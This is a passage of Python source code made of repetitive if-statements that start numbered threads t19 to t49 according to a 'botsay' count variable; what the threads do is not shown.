if botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t19.start()    
if botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t20.start()    
if botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t21.start()    
if botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t22.start()    
if botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t23.start()    
if botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t24.start()    
if botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t25.start()    
if botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t26.start()    
if botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t27.start()    
if botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t28.start()    
if botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t29.start()    
if botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t30.start()    
if botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t31.start()    
if botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t32.start()    
if botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t33.start()    
if botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t34.start()    
if botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t35.start()    
if botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t36.start()    
if botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t37.start()    
if botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t38.start()    
if botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t39.start()    
if botsay==40 or botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t40.start()    
if botsay==41 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t41.start()    
if botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t42.start()    
if botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t43.start()    
if botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t44.start()    
if botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t45.start()    
if botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t46.start()    
if botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t47.start()    
if botsay==48 or botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t48.start()
if botsay==49 or botsay==50 or botsay==51 or botsay==52 or botsay==53 or botsay==54 or botsay==55 or botsay==56 or botsay==57 or botsay==58 or botsay==59 or botsay==60 or botsay==61 or botsay==62 or botsay==63 or botsay==64 or botsay==65 or botsay==66 or botsay==67 or botsay==68 or botsay==69 or botsay==70 or botsay==71 or botsay==72 or botsay==73 or botsay==74 or botsay==75 or botsay==76 or botsay==77 or botsay==78 or botsay==79 or botsay==80 or botsay==81 or botsay==82 or botsay==83 or botsay==84 or botsay==85 or botsay==86 or botsay==87 or botsay==88 or botsay==89 or botsay==90 or botsay==91 or botsay==92 or botsay==93 or botsay==94 or botsay==95 or botsay==96 or botsay==97 or botsay==98 or botsay==99 or botsay==100 :
    t49.start()
